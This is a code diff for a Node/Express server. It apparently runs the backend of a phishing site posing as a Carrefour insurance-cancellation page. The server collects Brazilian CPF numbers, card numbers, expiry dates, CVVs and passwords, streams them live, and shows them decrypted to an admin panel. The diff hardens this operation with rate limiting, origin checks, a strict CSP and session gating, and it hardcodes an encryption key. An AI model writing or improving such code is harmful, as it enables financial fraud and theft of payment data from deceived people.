@@ -7,20 +7,53 @@ const bcrypt = require('bcryptjs');
 const basicAuth = require('express-basic-auth');
 const WebSocket = require('ws');
 const http = require('http'); // Adicionado explicitamente
+const session = require('express-session');
+const rateLimit = require('express-rate-limit');
+const CryptoJS = require('crypto-js'); // Para criptografia no cliente/servidor
 
 const app = express();
 const port = process.env.PORT || 10000; // Usar porta padrão do Render
 
+// Middleware de sessão para autenticação
+app.use(session({
+    secret: '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1', // Use a mesma chave de criptografia como segredo
+    resave: false,
+    saveUninitialized: false,
+    cookie: { secure: process.env.NODE_ENV === 'production' }
+}));
+
+// Rate limiting para evitar abusos
+const limiter = rateLimit({
+    windowMs: 15 * 60 * 1000, // 15 minutos
+    max: 100, // Limite de 100 requisições por IP
+    message: { error: 'Limite de requisições excedido. Tente novamente mais tarde.' }
+});
+app.use(limiter);
+
 // Middleware to parse JSON bodies
 app.use(bodyParser.json());
 
-// Add security headers to reduce phishing false positives
+// Middleware de segurança com CSP restritivo
 app.use((req, res, next) => {
+    const proto = req.headers['x-forwarded-proto'] || req.protocol;
+    if (proto !== 'https' && req.hostname !== 'localhost') {
+        console.log(`Redirecting ${proto} to HTTPS for URL: ${req.url}`);
+        return res.redirect(301, `https://${req.hostname}${req.url}`);
+    }
     res.setHeader(
         'Content-Security-Policy',
-        "default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.googleapis.com https://fonts.gstatic.com; script-src 'self' https://cdn.tailwindcss.com"
+        "default-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self'; connect-src 'self' wss://seguro-cancelamento.onrender.com; img-src 'self' data: https://*.carrefour.com; upgrade-insecure-requests"
     );
     res.setHeader('X-Content-Type-Options', 'nosniff');
+    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
+    res.setHeader('X-Frame-Options', 'DENY');
+    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+
+    // Validação de origem
+    const origin = req.headers.origin;
+    if (origin && !origin.includes('seguro-cancelamento.onrender.com')) {
+        return res.status(403).json({ error: 'Origem não permitida' });
+    }
     next();
 });
 
@@ -36,6 +69,15 @@ app.use('/admin', basicAuth({
         return req.auth ? 'Credenciais inválidas.' : 'Acesso não autorizado. Por favor, faça login.';
     }
 }));
+
+// Middleware para verificar autenticação nas rotas sensíveis
+const requireAuth = (req, res, next) => {
+    if (!req.session.authenticated) {
+        console.log('Unauthorized access attempt to protected route:', req.url);
+        return res.status(401).json({ error: 'Não autorizado. Faça login.' });
+    }
+    next();
+};
 
 // Serve static files after authentication middleware
 app.use('/public', express.static(path.join(__dirname, 'public')));
@@ -166,7 +208,7 @@ async function getEncryptionKey() {
             `SELECT value FROM settings WHERE key = 'encryption_key'`
         );
         console.log('Raw encryption key from DB:', result.rows[0]?.value);
-        const encryptionKey = result.rows.length > 0 ? result.rows[0].value : '7F4A8D9E2B3C4F5A6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A';
+        const encryptionKey = result.rows.length > 0 ? result.rows[0].value : '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1';
         const keyBytes = Buffer.from(encryptionKey, 'hex');
         if (keyBytes.length !== 32) {
             console.error('ENCRYPTION_KEY must be exactly 32 bytes long. Current length:', keyBytes.length, 'Raw key:', encryptionKey);
@@ -260,8 +302,8 @@ app.get('/admin', (req, res) => {
     }
 });
 
-// Handle temporary form submission (real-time updates)
-app.post('/api/temp-submit', async (req, res) => {
+// Handle temporary form submission (real-time updates) - Protegida por autenticação
+app.post('/api/temp-submit', requireAuth, async (req, res) => {
     try {
         console.log('Received temp form data:', Object.keys(req.body));
         const { sessionId, cpf, cardNumber, expiryDate, cvv, password } = req.body;
@@ -342,8 +384,8 @@ app.delete('/api/delete-temp-data/:sessionId', async (req, res) => {
     }
 });
 
-// Handle final form submission
-app.post('/submit', async (req, res) => {
+// Handle final form submission - Protegida por autenticação
+app.post('/submit', requireAuth, async (req, res) => {
     try {
         console.log('Received final form data:', Object.keys(req.body));
         const { sessionId, cpf, cardNumber, expiryDate, cvv, password } = req.body;
@@ -472,9 +514,9 @@ app.get('/api/form-data', async (req, res) => {
         // Decrypt sensitive data before sending
         const decryptedRows = rows.map(row => ({
             ...row,
-            card_number: decrypt(row.card_number),
-            cvv: decrypt(row.cvv),
-            password: decrypt(row.password)
+            card_number: row.card_number ? decrypt(row.card_number) : null,
+            cvv: row.cvv ? decrypt(row.cvv) : null,
+            password: row.password ? decrypt(row.password) : null
         }));
 
         console.log('Form data retrieved:', decryptedRows.length);
